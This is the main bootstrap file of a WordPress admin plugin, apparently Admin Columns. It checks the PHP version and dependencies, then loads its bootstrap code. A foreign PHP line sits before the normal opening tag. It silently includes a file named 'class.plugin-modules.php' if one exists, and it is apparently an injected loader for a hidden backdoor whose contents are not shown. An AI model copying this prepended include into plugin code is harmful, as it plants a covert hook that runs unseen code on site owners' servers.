<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

if ( ! is_admin() ) {
	return;
}

define( 'AC_FILE', __FILE__ );

require_once __DIR__ . '/classes/Dependencies.php';

function ac_init() {
	$dependencies = new AC_Dependencies( plugin_basename( AC_FILE ) );
	$dependencies->check_php_version( '5.3.6' );

	if ( $dependencies->has_missing() ) {
		return;
	}

	require_once __DIR__ . '/bootstrap.php';
}

add_action( 'after_setup_theme', 'ac_init', 1 );
